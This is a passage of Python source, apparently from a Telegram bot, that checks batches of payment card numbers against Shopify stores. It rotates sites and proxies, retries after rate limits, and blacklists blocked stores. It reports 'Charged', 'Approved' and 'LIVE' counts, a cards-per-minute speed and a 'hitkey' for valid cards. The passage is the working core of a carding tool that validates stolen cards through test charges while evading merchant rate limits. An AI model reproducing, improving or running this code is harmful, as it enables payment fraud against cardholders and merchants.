                            # Apply cooldown immediately (retry path previously skipped handle_batch_result, so cooldown never happened)
                            if "429" in reason_upper or "RATE_LIMIT" in reason_upper or "TOO MANY" in reason_upper:
                                site_cooldowns[site_url] = time.time() + COOLDOWN_SECONDS_429
                            retry_count = cards_retry_count.get(card_line, 0)
                            if retry_count < max_retries_per_card:
                                # Queue for retry with different site
                                cards_retry_count[card_line] = retry_count + 1
                                retry_queue.append((card_line, site_url))
                                log(f"[RETRY] Card queued for retry (attempt {retry_count + 2}/{max_retries_per_card + 1}): {card_line[:20]}...", "WARNING")
                                continue  # Don't count this as final result yet
                    
                    # Final result - process it
                    await handle_batch_result(card_line, result, site_url, product, stats, counter, batch_hits, quality_tracker)
                else:
                    stats["total"] += 1
                    stats["errors"] += 1
                    counter.errors += 1
                    counter.processed += 1
                    log(f"[BATCH] Unexpected result format: {type(result_tuple)}", "ERROR")
        
        # Update indices for next batch
        site_index += len(current_batch)
        proxy_index += len(current_batch)
        
        # Update live counter after each batch
        await counter.update()
        
        # Rate limiting between batches (minimal delay for speed)
        if card_index < total_cards or retry_queue:
            batch_delay = RATE_LIMIT_DELAY + (0.005 * effective_batch)  # Much smaller scaling
            await asyncio.sleep(batch_delay)
            
            # Force garbage collection every 5 batches
            if batch_num % 5 == 0:
                import gc
                gc.collect()
    
    # Log why the Shopify loop ended with user identifier
    log(f"[SH_{user_id}] ═══════════ CHECK LOOP ENDED ═══════════", "INFO")
    log(f"[SH_{user_id}] ✓ Loop ended: processed {card_index}/{total_cards} cards, {len(retry_queue)} pending retries", "INFO")
    log(f"[SH_{user_id}] Sites status: {len(valid_sites)} valid, {len(session_blacklist)} blocked, {len(instant_dead_sites)} removed", "INFO")

    # Final queue checkpoint (ensures resume works after stop/crash)
    try:
        await checkpoint_queue(force=True)
    except Exception:
        pass
    
    # Finish live counter
    await counter.finish()
    
    # NOTE: Do NOT call session_pool.close_all() here!
    # The session pool is shared between ALL users - closing it here
    # would break other users' active checks. Sessions are reused.
    log(f"[POOL] User {user_id} check finished (sessions kept for other users)", "DEBUG")

    # IMPORTANT: Do NOT clear the user's queue here.
    # We remove each processed card from the queue as results come in (live removal).
    # On stop/crash/redeploy, whatever remains in the queue is what should be resumed.
    
    # Do not clear a shared per-user progress message here (multi-job safe).
    
    # Calculate final stats
    live = stats['charged'] + stats['approved'] + stats['ccn'] + stats['insufficient']
    elapsed = time.time() - counter.start_time
    elapsed_str = f"{int(elapsed // 60)}:{int(elapsed % 60):02d}"
    
    # Generate hitkey if there are hits
    hitkey_msg = ""
    if batch_hits:
        hitkey = await create_hitkey(user_id, batch_hits)
        hitkey_msg = f"\n🔑 *Hitkey:* `{hitkey}`"
    
    batch_mode = "Sequential" if effective_batch == 1 else f"{effective_batch}x Parallel"
    skipped_msg = f"\n🚫 Sites auto-skipped: {len(session_blacklist)}" if session_blacklist else ""
    removed_msg = f"\n🗑 Sites auto-removed: {len(sites_removed)}" if sites_removed else ""
    live_pct = int(100*live/stats['total']) if stats['total'] > 0 else 0
    # Remaining queue for resume visibility
    try:
        remaining_cards = await get_user_cards(user_id)
        remaining_count = len(remaining_cards)
    except Exception:
        remaining_count = 0

    title = bold_sans("CHECK STOPPED") if was_cancelled else bold_sans("CHECK COMPLETE")
    remaining_line = f"\n📌 Remaining in queue: *{remaining_count}*" if remaining_count > 0 else ""

    summary = f"""🛒 {title} • Shopify

⚡ {batch_mode} • ⏱ {elapsed_str} • {counter.get_speed():.0f} cc/min

💎 *{stats['charged']}* Charged • ✨ *{stats['approved']}* Approved
🔶 *{stats['ccn']}* CCN • 💸 *{stats['insufficient']}* Insufficient
❌ {stats['declined']} Declined • ⚠️ {stats['errors']} Errors{skipped_msg}{removed_msg}

🟢 *LIVE: {live}* ({live_pct}%) / {stats['total']}{hitkey_msg}"""
    summary += remaining_line
    # Send summary with inline buttons
    await bot.send_message(chat_id, summary, parse_mode='Markdown', reply_markup=get_shopify_result_buttons())
    # Do not toggle global flags here; multi-job mode is tracked separately.


